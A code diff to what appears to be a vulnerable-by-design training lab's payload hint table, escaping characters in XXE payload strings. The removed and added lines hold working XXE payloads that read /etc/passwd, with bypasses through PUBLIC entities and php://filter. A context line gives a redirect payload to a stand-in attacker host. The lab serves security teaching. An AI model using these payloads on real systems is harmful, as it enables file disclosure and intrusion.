@@ -156,9 +156,9 @@ PAYLOADS.rd={
  expert:{p:"http://localhost.attacker.test/cb",n:"Expert — host-shape check; same subdomain works (real world: a parser differential)."}
 };
 PAYLOADS.xml={
- easy:{p:'<?xml version="1.0"?>\n<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>\n<order><item>&e;</item></order>',n:"Easy — SYSTEM + file:// (needs php-xml installed)."},
- medium:{p:'<?xml version="1.0"?>\n<!DOCTYPE x [<!ENTITY e PUBLIC "x" "file:///etc/passwd">]>\n<order><item>&e;</item></order>',n:"Medium — 'SYSTEM' blocked → use PUBLIC."},
- hard:{p:'<?xml version="1.0"?>\n<!DOCTYPE x [<!ENTITY e PUBLIC "x" "php://filter/convert.base64-encode/resource=/etc/passwd">]>\n<order><item>&e;</item></order>',n:"Hard — file:// blocked → php://filter, then base64-decode."},
+ easy:{p:'<\x3Fxml version="1.0"?\x3E\n<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>\n<order><item>&e;</item></order>',n:"Easy — SYSTEM + file:// (needs php-xml installed)."},
+ medium:{p:'<\x3Fxml version="1.0"?\x3E\n<!DOCTYPE x [<!ENTITY e PUBLIC "x" "file:///etc/passwd">]>\n<order><item>&e;</item></order>',n:"Medium — 'SYSTEM' blocked → use PUBLIC."},
+ hard:{p:'<\x3Fxml version="1.0"?\x3E\n<!DOCTYPE x [<!ENTITY e PUBLIC "x" "php://filter/convert.base64-encode/resource=/etc/passwd">]>\n<order><item>&e;</item></order>',n:"Hard — file:// blocked → php://filter, then base64-decode."},
  expert:{p:'(advanced) inline <!ENTITY is blocked → use an external DTD or parameter entities.',n:"Expert — inline entities blocked → external/parameter-entity DTD (advanced)."}
 };
 ['q','url','file','name','jwt','rd','xml'].forEach(function(c){ setLvl(c,'easy'); });
